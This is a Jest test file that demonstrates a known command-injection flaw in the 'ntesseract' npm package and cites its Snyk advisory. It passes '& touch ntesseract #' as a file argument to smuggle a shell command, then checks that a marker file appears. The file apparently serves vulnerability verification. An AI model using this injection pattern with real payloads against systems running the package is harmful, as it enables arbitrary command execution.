//https://snyk.io/vuln/SNYK-JS-NTESSERACT-1050982
test("Command Injection in ntesseract", () => {
  expect.assertions(2);
  const a = require("ntesseract");
  const fs = require("fs");
  const path = "./ntesseract";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.process("& touch ntesseract #", "/path/to/image.jpg", function () {});
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
